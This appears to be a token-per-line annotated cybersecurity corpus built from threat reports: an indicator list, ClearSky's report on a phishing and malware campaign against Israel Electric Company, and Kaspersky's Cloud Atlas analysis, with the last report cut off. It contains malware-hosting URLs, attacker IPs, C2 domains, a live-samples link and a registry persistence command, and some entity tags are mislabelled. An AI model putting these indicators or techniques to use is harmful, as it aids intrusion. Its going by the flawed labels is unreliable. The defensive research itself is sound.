4bd6a959cce13d1f5b5511a428e88c9c  B_hash
2ba0e52b885cabfbcd88866ab4072f54  B_hash
1d922e183418ac087933c526f7bd06c1  B_hash
3ce39f8afce9463c6d90c00ce72edb86  B_hash
77fd78042407a7318dba388da00700cc  B_hash
comments
delivery
email
source
address
______________________________________________________________________________
(
C
)

a5b3fb5119fad72ac321d8d6416b6b92  B_hash
30b843343590518e7b62c5f6db394bc2  B_hash
2a654ecb26664013d8e2369fe9c0b565  B_hash
b11b7b7b5bd80779dd885628d65e02e5  B_hash

Folder.exe
cc24cd17fa93fce7ea1128edeb9ee40b  B_hash
5e906ccb3b67131e4771ca72609c0648  B_hash

Drops
b11b7b7b5bd80779dd885628d65e02e5  B_hash
ad5531b085ef005ee12319e88fb8f674  B_hash
2f5397ad6205ab4463e6e3be9aba4efe  B_hash
0ae4345213cad388dbe38e2acda1a489  B_hash
28a5e9b2ef5cfd2edb7f31d3da9a5a15  B_hash
8655af063090ef192a7f1e0c05c7883f  B_hash
6e66ed5d8c7d4ca9c2e96f2cc045eb94  B_hash
d01848a20e0f5c4a7a7243bb98a7b26c  B_hash
923844dfc3d5b21f288df9beaa958baf  B_hash
639d768d575c45372ea707ed89423f36  B_hash
b4ab538f592082373e9ab96373561713  B_hash
b85c17f92629fec41502b44cf86ba859  B_hash
6f08808d0be510698563d3b0443fe5a4  B_hash
b8c6c8eeb9a18b1d4632bc8191db5517  B_hash
ddff0a7643f4ff2fe777e768e7bae004  B_hash
2395c798ca8628e735ac2d8d274cd230  B_hash
bc6baf7a1d420d226a7a157b412a51d9  B_hash
8ba38899a6446366724d98761dd10d46  B_hash
d538e50df25e30f3c4252ce523507d23  B_hash
a50da199db97abb2dfd6fd62b5a00f02  B_hash
2a1884bdab940ea66b28599245e79fa9  B_hash
2f30034885045bae4a201bf6b3913b54  B_hash
23c3f3e93ea2ffe704abb602d04588c0  B_hash
b8c6c8eeb9a18b1d4632bc8191db5517  B_hash
e5500274853f77be6ffba610dac2cae4  B_hash
ffa1bdc105013e1cbb00483b412b98b8  B_hash
0264076c190af6e1176e1abff47d1ae8  B_hash
02ef03bd5e6dbf9c03e8504c9e797abd  B_hash

Name
D:\IL\Working
Tools\2016-04-23
NeD
Ver
9
Ran
Il
192.52.167.118\NeD
Download
and
execute
Version
1
-

Doc\bin\Release\Obfuscated\News.pdb
http://bit[.]ly/1YRoIPX B_url.unknown
http://smail.otzo[.]com/W/Gfsdfsdfsrydkfpsdmfpsadsdfsdf B_url.unknown
sdfsdfdfsp.php  I
http://smail.otzo[.]com/y/analysis--hezbollah.rar B_url.unknown
https://drive.google[.]com/uc?export=download&amp;id= B_url.unknown
0B7XzN8DNbJKiQlFNRHdVTmpCd0U  I
https://drive.google[.]com/uc?export=download&id=0Bxa B_url.unknown

UrWGCqlWLMTQzMVFNOENIUFk  I
drops
ad5531b085ef005ee12319e88fb8f674  B_hash

Updata.exe
cleaned.exe
1.exe

New.exe

Folder.exe
log
file.exe
______________________________________________________________________________
(
C
)

https://drive.google[.]com/uc?export=download&id=0B7n  B_url.unknown
4BFDObRocdm1uS2J4SWVUNWc  I
http://drive.google[.]com/uc?export=download&id=0ByjYV   B_url.unknown

MTYJB0saHlTalJ6ZWlWWGM  I
support.mafy-koren[.]online/reg-update
support.mafy-koren[.]online/UFeed.php

Israel's
Cellebrite
linked
to
FBI's
iPhone
hack
attempt.exe

Report-Photos.rar

Analysis--Hezbollah.rar

Report.rar

Logs.exe
.דגא
תומייקו
תידיגאת
תוירחא
חוד

Analysis
and
estimates
(
Dahlan
)
heads
of
state
next

Palestine.exe

Report-Palestinian-President.rar

Folder.lnk

Folder.exe
.רורט
עוגיפב
העיצפ
טילש
דעלג

Intelligence
Report
Israelג€TMs
strategic
position
has
improved.exe

Updata.lnk
.مداقلا
نيطسلف
ةلود
سيئر
)نلاحد
دمحم(
تاريدقتو
ليلحت

Office
2016.exe
edikvlxhprg.lnk
edikvlxhprg.exe
plugin.exe

Fared-Ismael.rar
.
برقعلا
نجس
يف
ليعامسإ
ديرف
يدايقلا
تومل
ةيقيقحلا
ةصقلا
cleaned.exe
cbkp1vpsv1y.exe
jnpqmri1aus.exe
gzch5y2cyne.exe
retn0gzbksd.lnk
pktkvkgj4bl.lnk

Intelligence
agencies
succeeding
in
penetrating

Hezbollah.exe
ןכותה
ךלהמ
,שדוחהו
.רתויב
חלצומה
ןכותה
ךלהמ
תא
שדוח
לכב
תורחוב
.לודגה
סקסה
רקס
סקרוד

Intelligence
Report
Israel's
strategic
position
has
improved.exe
.مداقلا
نيطسلف
ةلود
سيئر
)نلاحد
دمحم(
تاريدقتو
ليلحت
in
\Startup\
in
\Startup\
in
\Startup\
in
\Startup\
in
\Startup\
in
\Startup\
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
filename
x509
fingerprint
cadd3141e42227c0a30aa58ab3ca9fa91384f4c7  B_hash

SSL
communication
with
C2
x509
fingerprint
9fb60ae410cf8e7739535aaa9771edd781f766d3  B_hash

SSL
communication
with
C2
x509
fingerprint
0387ac82a3eabd3ffc48a73cc440e02ce3018bc8  B_hash

SSL
communication
with
C2
x509
fingerprint
9fb60ae410cf8e7739535aaa9771edd781f766d3  B_hash

SSL
communication
with
C2
______________________________________________________________________________
(
C
)
Operation
Electric
Powder
–
Who
is
targeting
Israel
Electric

Company
?
clearskysec.com B_url.normal
/iec/

Attackers
have
been
trying
to
breach
IEC
(
Israel
Electric
Company
)
in
a
year-long
campaign
.

From
April
2016
until
at
least
February
2017
,
attackers
have
been
spreading
malware
via
fake
Facebook
profiles
and
pages
,
breached
websites
,
self-hosted
and
cloud
based
websites
.

Various
artifacts
indicate
that
the
main
target
of
this
campaign
is
IEC
–
Israel
Electric
Company
.
These
include
domains
,
file
names
,
Java
package
names
,
and

Facebook
activity
.

We
dubbed
this
campaign
'
Operation
Electric
Powder
'
.

Israel
Electric
Company
(
also
known
as
Israel
Electric
Corporation
)
'
is
the
largest
supplier
of
electrical
power
in

Israel
.

The
IEC
builds
,
maintains
,
and
operates
power
generation
stations
,
sub-stations
,
as
well
as
transmission
and
distribution
networks
.

The
company
is
the
sole
integrated
electric
utility
in
the
State
of
Israel
.

It
installed
generating
capacity
represents
about
75%
of
the
total
electricity
production
capacity
in
the
country
.
'

It
is
notable
that
the
operational
level
and
the
technological
sophistication
of
the
attackers
are
not
high
.
Also
,
they
are
having
hard
time
preparing
decoy
documents
and
websites
in
Hebrew
and
English
.
Therefore
,
in
most
cases
a
vigilant
target
should
be
able
to
notice
the
attack
and
avoid
infection
.
We
do
not
have
indication
that
the
attacks
succeeded
in
infecting
IEC
related
computers
or
stealing
information
.

Currently
we
do
not
know
who
is
behind
Operation
Electric
Powder
or
what
its
objectives
are
.
See
further
discussion
in
the
Attribution
section
.

Impersonating
Israeli
news
site

The
attackers
registered
and
used
in
multiple
attacks
the
domain
ynetnewes[.]com B_url.normal
(
note
the
extra
e
)
.
This
domain
impersonates
ynetnews.com  B_url.unknown
,
the
English
version
of
ynet.co.il  B_url.unknown
–
one
of
Israel's
most
popular
news
sites
.

Certain
pages
within
the
domain
would
load
the
legitimate
Ynet
website
:
1/13

Others
,
which
are
opened
as
decoy
during
malware
infection
,
had
copied
content
from
a
different
news
site
:

The
URL
ynetnewes[.]com/video/Newfilm.html  B_url.normal
contained
an
article
about
Brad
Pitt
and
Marion
Cotillard
copied
from
another
site
.
At
the
bottom
was
a
link
saying
'
Here
For
Watch
It
!
'
:
2/13

The
link
pointed
to
goo[.]gl/zxhJxu B_url.normal
(
Google's
URL
shortening
service
)
.
According
to
the
statistics
page
,
it
had
been
created
on
September
25
,
2016
and
have
been
clicked
only
11
times
.
When
clicked
,
it
would
redirect
to
iecr[.]co/info/index_info.php
.

We
do
not
know
what
was
the
content
in
the
final
URL
.
We
estimate
that
it
served
malware
.
The
domain
iecr[.]co
was
used
as
a
command
and
control
server
for
other
malware
in
this
campaign
.

Another
URL
,
http://ynetnewes[.]com/resources/assets/downloads/svchost.exe B_url.unknown
hosted
a
malware
file
called
program_stream_film_for_watch.exe B_malware.unknown
.
(
d020b08f5a6aef1f1072133d11f919f8  B_hash
)

Fake
Facebook
profile
–
Linda
Santos

One
of
the
above
mentioned
malicious
URLs
was
spread
via
comments
by
a
fake
Facebook
profile
–
Linda
Santos
(
no
longer
available
)
:

In
September
2016
,
the
fake
profile
commented
to
posts
by
Israel
Electric
Company
:
3/13
4/13

The
profile
had
dozens
of
friends
,
almost
all
were
IEC
employees
:
5/13

The
fake
profile
was
following
only
three
pages
,
one
of
which
was
the
IEC
official
page
:

Pokemon
Go
Facebook
page

In
July
2016
,
when
mobile
game
'
Pokemon
Go
'
was
at
the
peak
of
its
popularity
,
the
attackers
created
a
Facebook
page
impersonating
the
official
Pokemon
Go
page
:

The
page
,
which
is
no
longer
available
,
had
about
one
hundred
followers
–
most
were
Arab
Israelis
and
some
were

Jewish
Israelis
.

Only
one
post
was
published
,
with
text
in
English
and
Hebrew
.
Grammatical
mistakes
indicate
the
attackers
are
not
native
to
both
languages
:
6/13

The
post
linked
to
a
malicious
website
hosted
in
yolasite.com  B_url.unknown
(
which
is
a
legitimate
website
building
and
hosting
platform
)
:
pokemonisrael.yolasite[.]com  B_url.unknown

The
button
–
'
another
website
:
ומחשב
טלפון
להורדה
'
(
literal
translation
–
'
To
download
phone
and
computer
'
)
linked
to
a
zip
file
in
7/13
http://iec-co-il[.]com/iec/electricity/Pokemon-PC.zip B_url.unknown

Note
that
the
domain
being
impersonated
is
that
of
Israel
Electric
Company's
website
(
iec.co.il B_url.unknown
)
.

Pokemon-PC.zip
(
40303cd6abe7004659ca3447767e4eb7  B_hash
)
contained
Pokemon-PC.exe
(
e45119a72677ed15ee0f04ef936a9803  B_hash
)
,
which
at
run
time
drops
monitar.exe
(
d3e0b129bad263e6c0dcb1a9da55978b  B_hash
)
:

Android
phone
malware

The
attackers
also
distributed
a
malicious
app
for
Android
devices
–
pokemon.apk
(
3137448e0cb7ad83c433a27b6dbfb090  B_hash
)
.

This
malware
also
had
characteristics
that
impersonate
IEC B_malware.unknown
,
such
as
the
package
name
:

The
application
is
a
dropper
that
extracts
and
installs
a
spyware
.

The
dropper
does
not
ask
for
any
permission
during
installation
:

However
,
when
the
spyware
is
installed
,
it
asks
for
multiple
sensitive
permissions
:

The
victim
ends
up
with
two
applications
installed
on
their
device
.

The

Dropper
,
pretending
to
be
a
Pokemon
Go
app
,
adds
an
icon
to
the
phone
dashboard
.
However
,
it
does
not
have
any
functionality
,
and
when
clicked
,
this
error
message
is
displayed
:

Error
505

Sorry
,
this
version
is
not
compatible
with
your
android
version
.

The
dropper
does
not
really
check
what
android
version
is
installed
:
8/13

The
message
is
intended
to
make
the
victim
believe
that
the
Pokemon
game
does
not
work
because
of
compatibility
issues
.

The
victim
is
likely
to
uninstall
the
application B_malware.unknown
at
this
point
.

However
,
because
a
second
application B_malware.unknown
was
installed
,
the
phone
would
stay
infected
unless
it
is
uninstalled
as
well
.

9/13

Websites
for
Malware
distribution

Malware
was
also
hosted
in
legitimate
breached
Israeli
websites
,
such
as
this
educational
website
:
http://www.bagrut3.org[.]il/upload/edu_shlishit/passwordlist.exe  B_url.unknown
(
defc340825cf56f18b5ba688e6695e68  B_hash
)
and
a
small
law
firm's
website
:
http://sheinin[.]co.il/MyPhoto.zip  B_url.unknown
(
650fcd25a917b37485c48616f6e17712  B_hash
)

In
journey-in-israel[.]com B_url.unknown
,
the
attackers
inserted
an
exploit
code
for
CVE-2014-6332 B_malware.unknown
–
a
Windows
code
execution
vulnerability
.
The
exploit
was
copied
from
an
online
source
,
likely
from
here
,
as
the
code
included
the
same
comments
.
The
website
also
hosted
this
malware
:
afd5288d9aeb0c3ef7b37becb7ed4d5c  B_hash
.

In
other
cases
,
the
attackers
registered
and
built
malicious
websites
:
users-management[.]com  B_url.normal
and
sourcefarge[.]net B_url.normal
(
similar
to
legitimate
software
website
sourceforge.net
)
.
The
latter
was
redirecting
to
journeyin-israel[.]com
and
iec-co-il[.]com
in
May
and
July
2016
,
according
to
PassiveTotal
:

Sample
24befa319fd96dea587f82eb945f5d2a  B_hash
,
potentially
only
a
test
file
,
is
a
self-extracting
archive
(
SFX
)
that
contains
two
files
:
a
legitimate
Putty
installation
and
link.html
:

When
run
,
while
putty
is
installed
,
the
html
file
is
opened
in
a
browser
and
redirects
to
http://tinyurl[.]com/jerhz2a  B_url.normal
and
then
to
http://users-management[.]com/info/index_info.php?id=9775 B_url.normal
.

The
last
page
302
redirects
to
the
website
of
an
Israeli
office
supply
company
Mafil
:
10/13

Sample
f6d5b8d58079c5a008f7629bdd77ba7f  B_hash
,
also
a
self-extracting
archive
,
contained
a
decoy
PDF
document
and
a
backdoor
:

The
PDF
,
named
IEC.pdf
,
is
a
warranty
document
taken
from
Mafil's
public
website
.

It
is
displayed
to
the
victim
while
the
malware
(
6aeb71d05a2f9b7c52ec06d65d838e82  B_hash
)
is
infecting
its
computer
:

Windows
Malware

The
attackers
developed
three
malware
types
for
Windows
based
computers
:
11/13

Dropper B_malware.backdoor
–
self-extracting
archives
that
extract
and
run
the
backdoor
,
sometimes
while
opening
a
decoy
PDF
document
or
website
.
(
For
example
:
6fa869f17b703a1282b8f386d0d87bd4  B_hash
)

Trojan  B_malware.backdoor
backdoor
/
downloader
–
malware
that
collects
information
about
the
system
and
can
download
and
execute
other
files
.
(
909125d1de7ac584c15f81a34262846f  B_hash
)

Some
samples
had
two
hardcoded
command
and
control
servers
:
iecrs[.]co
and
iecr[.]co
(
note
once
again
the
use
of
IEC
in
the
domain
name
)
.

Keylogger B_malware.drop
/
screen  B_malware.drop
grabber I
–
records
keystrokes
and
takes
screenshots
.
The
malware
file
is
compiled

Python
code
.
(
d3e0b129bad263e6c0dcb1a9da55978b  B_hash
)

An
analysis
of
the
malware
and
other
parts
of
the
campaign
was
published
by
Mcafee
in
on
November
11
,
2016
.

The
latest
known
sample
in
this
campaign
(
7ceac3389a5c97a3008aae9a270c706a  B_hash
)
has
compilation
timestamp
of

February
12
,
2017
.
It
is
dropped
when
'
pdf
file
products
israel
electric.exe
'
(
c13c566b079258bf0782d9fb64612529  B_hash
)
is
executed
.

Attribution

In
a
report
that
covers
other
parts
of
the
campaign
,
Mcafee
attribute
it
to
Gaza
Cybergang
(
AKA
Gaza
Hacker
Team

AKA
Molerats
)
.
However
,
the
report
does
not
present
strong
evidence
to
support
this
conclusion
.

While
initially
we
thought
the
same
,
currently
we
cannot
relate
Operation
Electric
Powder
to
any
known
group
.

Moreover
,
besides
Mohamad B_malware.unknown
potentially
being
the
name
of
the
malware
developer
(
based
on
PDB
string
found
in
multiple
samples
:
C:\Users\Mohammed.MU\Desktop\AM\programming\C\tsDownloader\Release\tsDownloader.pdb
)
,
we
do
not
have
evidence
that
the
attackers
are
Arabs
.

Indicators
of
compromise

Indicators
file
:
Operation-Electric-Powder-indicators.csv
(
also
available
on
PassiveTotal
)
.

Notably
,
all
but
one
of
the
IP
addresses
in
use
by
the
attackers
belong
to
German
IT
services
provider
'
Accelerated
IT
Services
GmbH
'
(
AS31400
)
:
84.200.32.211 B_ip.attack
84.200.2.76 B_ip.attack
84.200.17.123 B_ip.attack
84.200.68.97  B_ip.attack
82.211.30.212 B_ip.attack
82.211.30.186 B_ip.attack
82.211.30.192 B_ip.attack

Florian
Roth
shared
a
Yara
rule
to
detect
the
downloader
:
Operation-Electric-Powder-yara.txt

The
graph
below
depicts
the
campaign
infrastructure
(
click
the
image
to
see
the
full
graph
)
:
12/13

Live
samples
can
be
downloaded
from
the
following
link
:
https://ln.sync[.]com/dl/30e722bf0#f72zgiwk-zxcp3e9t-fa9jyakr-zpbf5hgg  B_url.normal
(
Please
email
info@clearskysec.com  B_url.normal
to
get
the
password
.
)

Acknowledgments

This
research
was
facilitated
by
PassiveTotal
for
threat
infrastructure
analysis
,
and
by
MalNet
for
malware
research
.

13/13
Cloud B_malware.unknown
Atlas I
:
RedOctober  B_malware.unknown
APT
is
back
in
style

Two
years
ago
,
we
published
our
research
into
RedOctober  B_malware.unknown
,
a
complex
cyber-espionage
operation
targeting
diplomatic
embassies
worldwide
.
We
named
it
RedOctober  B_malware.unknown
because
we
started
this
investigation
in
October
2012
,
an
unusually
hot
month
.

After
our
announcement
in
January
2013
,
the
RedOctober  B_malware.unknown
operation
was
promptly
shut
down
and
the
network
of
C&Cs
was
dismantled
.

As
usually
happens
with
these
big
operations
,
considering
the
huge
investment
and
number
of
resources
behind
it
,
they
don't
just
'
go
away
'
forever
.

Normally
,
the
group
goes
underground
for
a
few
months
,
redesigns
the
tools
and
the
malware
and
resume
operations
.

See
:

RedOctober  B_malware.unknown
Part
1

RedOctober  B_malware.unknown
Part
2

Since
January
2013
,
we've
been
on
the
lookout
for
a
possible
RedOctober  B_malware.unknown
comeback
.

One
possible
hit
was
triggered
when
we
observed
Mevade  B_malware.unknown
,
an
unusual
piece
of
malware
that
appeared
late
in
2013
.

The
Mevade  B_malware.unknown

C&C I
name
styles
as
well
as
some
other
technical
similarities
indicated
a
connection
to
RedOctober  B_malware.unknown
,
but
the
link
was
weak
.

It
wasn't
until
August
2014
that
we
observed
something
which
made
us
wonder
if

RedOctober  B_malware.unknown
is
back
for
good
.

Meet
Cloud  B_malware.unknown
Atlas  I

In
August
2014
,
some
of
our
users
observed
targeted
attacks
with
a
variation
of
CVE-2012-0158 B_malware.unknown
and
an
unusual
set
of
malware
.

We
did
a
quick
analysis
of
the
malware
and
it
immediately
stood
out
because
of
certain
unusual
things
that
are
not
very
common
in
the
APT
world
.

Some
of
the
filenames
used
in
the
attacks
included
:

FT
-
Ukraine
Russia's
new
art
of
war.doc

Катастрофа
малайзийского
лайнера.doc

Diplomatic
Car
for
Sale.doc

МВКСИ.doc

Organigrama
Gobierno
Rusia.doc

Фото.doc

Информационное
письмо.doc

Форма
заявки
(
25-26.09.14).doc

Информационное
письмо.doc

Письмо_Руководителям.doc

Прилож.doc

Car
for
sale.doc

Af-Pak
and
Central
Asia's
security
issues.doc

At
least
one
of
them
immediately
reminded
us
of
RedOctober  B_malware.unknown
,
which
used
a
very
similarly
named
spearphish  B_malware.unknown
:
'
Diplomatic
Car
for
Sale.doc
'
.

As
we
started
digging
into
the
operation
,
more
details
emerged
which
supported
this
theory
.

Perhaps
the
most
unusual
fact
was
that
the
Microsoft
Office
exploit
didn't
directly
write
a
Windows
PE
backdoor
on
disk
.

Instead
,
it
writes
an
encrypted
Visual
Basic
Script
and
runs
it
.

Cloud  B_malware.unknown
Atlas  I
exploit
payload
-
VBScript  B_malware.unknown

This
VBScript  B_malware.unknown
drops
a
pair
of
files
on
disk
-
a
loader
and
an
encrypted
payload
.

The
loader
appears
to
be
different
every
time
and
internal
strings
indicate
it
is
'
polymorphically
'
generated
.

The
payload
is
always
encrypted
with
a
unique
key
,
making
it
impossible
to
decrypt
unless
the
DLL
is
available
.

We
observed
several
different
Spear-phishing  B_malware.backdoor
documents
that
drop
uniquely
named
payloads
.

For
instance
,
the
'
qPd0aKJu.vbs
'
file
MD5
:

E211C2BAD9A83A6A4247EC3959E2A730  B_hash
drops
the
following
files
:

DECF56296C50BD3AE10A49747573A346  B_hash
-
bicorporate
-
encrypted
payload

D171DB37EF28F42740644F4028BCF727  B_hash
-
ctfmonrn.dll
-
loader

The
VBS
also
adds
a
registry
key
:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\
setting
the
key
'
bookstore
'
to
the
value
'
regsvr32
%path%\ctfmonrn.dll
/s
'
,
which
ensures
the
malware
runs
every
time
at
system
boot
.

Some
of
the
DLL
names
we
observed
include
:
f4e15c1c2c95c651423dbb4cbe6c8fd5  B_hash
-
bicorporate.dll
649ff144aea6796679f8f9a1e9f51479  B_hash
-
fundamentive.dll
40e70f7f5d9cb1a669f8d8f306113485  B_hash
-
papersaving.dll
58db8f33a9cdd321d9525d1e68c06456  B_hash
-
previliges.dll
f5476728deb53fe2fa98e6a33577a9da  B_hash
-
steinheimman.dll

Some
of
the
payload
names
include
:
steinheimman
papersaving
previliges
fundamentive
bicorporate
miditiming
damnatorily
munnopsis
arzner
redtailed
roodgoose
acholias
salefians
wartworts
frequencyuse
nonmagyar
shebir
getgoing

The
payload
includes
an
encrypted
configuration
block
which
contains
information
about
the
C&C
sever
:

The
information
from
the
config
includes
a
WebDAV
URL
which
is
used
for
connections
,
a
username
and
password
,
two
folders
on
the
WebDAV
server
used
to
store
plugins/modules
for
the
malware
and
where
data
from
the
victim
should
be
uploaded
.

C&C
communication

The
Cloud  B_malware.unknown
Atlas  I
implants
utilize
a
rather
unusual
C&C
mechanism
.

All
the
malware
samples
we've
seen
communicate
via
HTTPS
and
WebDav
with
the
same
server
'
cloudme.com B_url.unknown
'
,
a
cloud
services
provider
.

According
to
their
website
,
CloudMe
is
owned
and
operated
by
CloudMe
AB
,
a
company
based
in

Linköping
,
Sweden
.

(
Important
note
:
we
do
not
believe
that
CloudMe
is
in
any
way
related
to
the
Cloud  B_malware.unknown
Atlas  I
group
-
the
attackers
simply
create
free
accounts
on
this
provider
and
abuse
them
for
command-and-control
)
.

Each
malware
set
we
have
observed
so
far
communicates
with
a
different
CloudMe
account
though
.

The
attackers
upload
data
to
the
account
,
which
is
downloaded
by
the
implant
,
decrypted
and
interpreted
.

In
turn
,
the
malware
uploads
the
replies
back
to
the
server
via
the
same
mechanism
.

Of
course
,
it
should
be
possible
to
reconfigure
the
malware
to
use
any
Cloud-based
storage
service
that
supports
WebDAV
.

Here's
a
look
at
one
such
account
from
CloudMe
:

The
data
from
the
account
:

The
files
stored
in
the
randomly
named
folder
were
uploaded
by
the
malware
and
contain
various
things
,
such
as
system
information
,
running
processes
and
current
username
.

The
data
is
compressed
with
LZMA
and
encrypted
with
AES
,
however
,
the
keys
are
stored
in
the
malware
body
which
makes
it
possible
to
decrypt
the
information
from
the
C&C
.

We
previously
observed
only
one
other
group
using
a
similar
method
–
ItaDuke B_malware.unknown
–
that
connected
to
accounts
on
the
cloud
provider
mydrive.ch
.

Victim
statistics
:
top
5
infected
countries

Similarities
with
RedOctober  B_malware.unknown

Just
like
with
RedOctober  B_malware.unknown
,
the
top
target
of
Cloud  B_malware.unknown
Atlas  I
is
Russia
,
followed
closely
by
Kazakhstan
,
according
to
data
from
the
Kaspersky
Security
Network
(
KSN
)
.

Actually
,
we
see
an
obvious
overlap
of
targets
between
the
two
,
with
subtle
differences
which
closely
account
for
the
geopolitical
changes
in
the
region
that
happened
during
the
last
two
years
.

Interestingly
,
some
of
the
spear-phishing  B_malware.backdoor
documents
between
Cloud  B_malware.unknown
Atlas  I
and
RedOctober  B_malware.unknown
seem
to
exploit
the
same
theme
and
were
used
to
target
the
same
entity
at
different
times
.

Both
Cloud
Atlas
and
RedOctober  B_malware.unknown
malware
implants
rely
on
a
similar
construct
,
with
a
loader
and
the
final
payload
that
is
stored
encrypted
and
compressed
in
an
external
file
.
There
are
some
important
differences
though
,
especially
in
the
encryption
algorithms
used
–
RC4
in
RedOctober  B_malware.unknown
vs
AES
in
Cloud  B_malware.unknown
Atlas  I
.

The
usage
of
the
compression
algorithms
in
Cloud
Altas
and
RedOctober  B_malware.unknown
is
another
interesting
similarity
.

Both
malicious
programs
share
the
code
for
LZMA
compression
algorithm
.
In
CloudAtlas  B_malware.unknown
it
is
used
to
compress
the
logs
and
to
decompress
the
decrypted
payload
from
the
C&C
servers
,
while
in
Red
October
the
'
scheduler
'
plugin
uses
it
to
decompress
executable
payloads
from
the
C&C
.

It
turns
out
that
the
implementation
of
the
algorithm
is
identical
in
both
malicious
modules
,
however
the
way
it
is
invoked
is
a
bit
different
,
with
additional
input
sanity
checks
added
to
the
CloudAtlas  B_malware.unknown
version
.

Another
interesting
similarity
between
the
malware
families
is
the
configuration
of
the
build
system
used
to
compile
the
binaries
.

Every
binary
created
using
the
Microsoft
Visual
Studio
toolchain
has
a
special
header
that
contains
information
about
the
number
of
input
object
files
and
version
information
of
the
compilers
used
to
create
them
,
the
'
Rich
'
header
called
so
by
the
magic
string
that
is
used
to
identify
it
in
the
file
.

We
have
been
able
to
identify
several
RedOctober  B_malware.unknown
binaries
that
have
'
Rich
'
headers
describing
exactly
the
same
layout
of
VC
2010
+
VC
2008
object
files
.

Although
this
doesn't
necessarily
mean
that
the
binaries
were
created
on
the
same
development
computer
,
they
were
definitely
compiled
using
the
same
version
of
the
Microsoft
Visual
Studio
up
to
the
build
number
version
and
using
similar
project
configuration
.

Number
of
object
files
,
CloudAtlas  B_malware.unknown
loader

Number
of
object
files
,
Red
October

Office
plugin

Number
of
object
files,Red
October

Fileputexec
plugin

HEX
compiler
version

Decoded
compiler
version
009D766F  B_hash
009B766F  B_hash
00AB766F  B_hash
00010000  B_hash
00937809  B_hash
00AA766F  B_hash
009E766F  B_hash

VC
2010
(
build
30319
)

VC
2010
(
build
30319
)

VC
2010
(
build
30319
)

VC
2008
(
build
30729
)

VC
2010
(
build
30319
)

VC
2010
(
build
30319
)

To
summarize
the
similarities
between
the
two
:

Cloud  B_malware.unknown
Atlas  I

RedOctober  B_malware.unknown

Shellcode
marker
in
spearphished  B_malware.unknown
documents

Top
target
country

Compression
algorithm
used
for

C&C
communications

C&C
servers
claim
to
be
/
redirect
to
BBC
(
mobile
malware
)

Russia

PT@T

LZMA

Compiler
version

VC
2010
(
build
30319
)

PT@T

Russia

LZMA

VC
2010
(
build
30319
)
(
some
modules
)

Finally
,
perhaps
the
strongest
connection
comes
from
targeting
.
Based
on
observations
from
KSN
,
some
of
the
victims
of
RedOctober  B_malware.unknown
are
also
being
targeted
by
CloudAtlas  B_malware.unknown
.

In
at
least
one
case
,
the
victim's
computer
was
attacked
only
twice
in
the
last
two
years
,
with
only
two
malicious
programs
–
RedOctober  B_malware.unknown
and
Cloud  B_malware.unknown
Atlas  I
.

These
and
other
details
make
us
believe
that
CloudAtlas  B_malware.unknown
represents
a
rebirth
of
the
RedOctober  B_malware.unknown
attacks
.

Conclusion

Following
big
announcements
and
public
exposures
of
targeted
attack
operations
,
APT
groups
behave
in
a
predictable
manner
.

Most
Chinese-speaking
attackers
simply
relocate
C&C
servers
to
a
different
place
,
recompile
the
malware
and
carry
on
as
if
nothing
happened
.

Other
groups
that
are
more
nervous
about
exposure
go
in
a
hibernation
mode
for
months
or
years
.

Some
may
never
return
using
the
same
tools
and
techniques
.

However
,
when
a
major
cyber-espionage
operation
is
exposed
,
the
attackers
are
unlikely
to
completely
shut
down
everything
.
They
simply
go
offline
for
some
time
,
completely
reshuffle
their
tools
and
return
with
rejuvenated
forces
.

We
believe
this
is
also
the
case
of
RedOctober  B_malware.unknown
,
which
makes
a
classy
return
with
Cloud

Atlas
.

Kaspersky
products
detect
the
malware
from
the
Cloud  B_malware.unknown
Atlas  I
toolset
with
the
following
verdicts
:

Exploit.Win32.CVE-2012-0158.j B_malware.unknown

Exploit.Win32.CVE-2012-0158.eu  B_malware.unknown

Exploit.Win32.CVE-2012-0158.aw  B_malware.unknown

Exploit.MSWord.CVE-2012-0158.ea B_malware.unknown

HEUR:Trojan.Win32.CloudAtlas.gen  B_malware.unknown

HEUR:Trojan.Win32.Generic B_malware.unknown

HEUR:Trojan.Script.Generic  B_malware.unknown

Trojan-Spy.Win32.Agent.ctda B_malware.unknown

Trojan-Spy.Win32.Agent.cteq B_malware.unknown

Trojan-Spy.Win32.Agent.ctgm B_malware.unknown

Trojan-Spy.Win32.Agent.ctfh B_malware.unknown

Trojan-Spy.Win32.Agent.cter B_malware.unknown

Trojan-Spy.Win32.Agent.ctfk B_malware.unknown

Trojan-Spy.Win32.Agent.ctfj B_malware.unknown

Trojan-Spy.Win32.Agent.crtk B_malware.unknown

Trojan-Spy.Win32.Agent.ctcz B_malware.unknown

Trojan-Spy.Win32.Agent.cqyc B_malware.unknown

Trojan-Spy.Win32.Agent.ctfg B_malware.unknown

Trojan-Spy.Win32.Agent.ctfi B_malware.unknown

Trojan-Spy.Win32.Agent.cquy B_malware.unknown

Trojan-Spy.Win32.Agent.ctew B_malware.unknown

Trojan-Spy.Win32.Agent.ctdg B_malware.unknown

Trojan-Spy.Win32.Agent.ctlf B_malware.unknown

Trojan-Spy.Win32.Agent.ctpz B_malware.unknown

Trojan-Spy.Win32.Agent.ctdq B_malware.unknown

Trojan-Spy.Win32.Agent.ctgm B_malware.unknown

Trojan-Spy.Win32.Agent.ctin B_malware.unknown

Trojan-Spy.Win32.Agent.ctlg B_malware.unknown

Trojan-Spy.Win32.Agent.ctpd B_malware.unknown

Trojan-Spy.Win32.Agent.ctps B_malware.unknown

Trojan-Spy.Win32.Agent.ctpq B_malware.unknown

Trojan-Spy.Win32.Agent.ctpy B_malware.unknown

Trojan-Spy.Win32.Agent.ctie B_malware.unknown

Trojan-Spy.Win32.Agent.ctcz B_malware.unknown

Trojan-Spy.Win32.Agent.ctgz B_malware.unknown

Trojan-Spy.Win32.Agent.ctpr B_malware.unknown

Trojan-Spy.Win32.Agent.ctdp B_malware.unknown

Trojan-Spy.Win32.Agent.ctdr B_malware.unknown

Trojan.Win32.Agent.idso B_malware.unknown

Trojan.Win32.Agent.idrx B_malware.unknown

HEUR:Trojan.Linux.CloudAtlas.a  B_malware.unknown

Trojan.AndroidOS.CloudAtlas.a  B_malware.unknown

Trojan.IphoneOS.CloudAtlas.a  B_malware.unknown

Parallel
research
:

Blue
Coat
Exposes
Inception
Framework
Cmstar B_malware.unknown
Downloader  I
:
Lurid B_malware.unknown
and
Enfal's B_malware.unknown
New
Cousin

In
recent
weeks
,
Unit
42
has
been
analyzing
delivery
documents
used
in
spear-phishing
attacks
that
